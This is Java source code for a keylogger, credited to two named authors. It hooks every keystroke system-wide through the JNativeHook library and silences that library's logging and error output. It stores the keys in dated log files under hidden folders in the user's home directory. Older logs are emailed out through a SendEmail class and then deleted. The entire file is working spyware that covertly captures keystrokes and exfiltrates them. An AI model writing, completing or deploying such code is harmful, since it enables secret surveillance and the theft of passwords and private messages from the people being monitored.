/*
 *  KeyLogger.java
 *  
 *  @Authors: Niklas Adolfsson and Alexander Persson
 *  @Date: 2016-05-13
 *  
 *  Registers key event by written to logfile with a specific date according to the Java Calender API
 *  Logs are located differently between Windows and other
 *  Send email with logs if older logs exist
 */


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener 
{
  private String logPath;
  
  public KeyLogger()
  {
    if ( System.getProperty("os.name").toLowerCase().startsWith("windows") )
    {
      logPath = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "kl";
    }
    else
    {
      logPath = System.getProperty("user.home").toLowerCase() + File.separator + ".kl";
    }
  }
  
  public static void main(String[] args) throws InterruptedException 
  {
    
    Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
    logger.setLevel(Level.OFF);

    try 
    {
      GlobalScreen.registerNativeHook();
    } 
    catch (NativeHookException ex) 
    {
      //System.err.println(ex.getMessage());
      System.exit(1);
    }

    NativeKeyEvent ev = new NativeKeyEvent(
        NativeKeyEvent.NATIVE_KEY_PRESSED,
        System.currentTimeMillis(),
        0x00,
        0x00,
        NativeKeyEvent.VC_MEDIA_PLAY,
        NativeKeyEvent.CHAR_UNDEFINED,
        NativeKeyEvent.KEY_LOCATION_STANDARD);

    GlobalScreen.addNativeKeyListener(new KeyLogger ());

    GlobalScreen.postNativeEvent(ev);
  }

  public void nativeKeyPressed(NativeKeyEvent e) 
  {
    if ( e.getKeyCode() == 57378)
    {
      return;
    }
    else
    {
      DummyDate now = new DummyDate();
      /* NEW DAY */
      File logdir = new File(logPath);
      File [] flist = logdir.listFiles();
      File sendFile = null;
      if ( flist.length != 0 )
      {
        /* search for old log that has not been sent */
        for (File f : flist)
        {
          if ( !f.getName().toLowerCase().contains(now.toString()) && f.getName().toLowerCase().contains("key.log"))
          {
            sendFile = new File(f.getAbsolutePath());
            SendEmail email = new SendEmail();
            /* email successfully sent then delete the log */
            if ( email.send(sendFile.getAbsolutePath(),sendFile.getName()) )
            {
              sendFile.delete();
            }
          }
        }
      }
      
      BufferedWriter bw = null;
      try
      {
        bw = new BufferedWriter(new FileWriter(logPath + File.separator 
           + "key.log" + now.toString() , true));
        bw.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
        bw.flush();
      }
      catch ( IOException ex)
      {
        //System.err.println(ex.getMessage());
      }
      finally
      {
        if ( bw != null)
        {
          try 
          {
            bw.close();
          }
          catch ( IOException ex)
          {

          }
        }
      }
    }
  }

  public void nativeKeyReleased(NativeKeyEvent e) 
  {

  }

  public void nativeKeyTyped(NativeKeyEvent e) {

  }
}
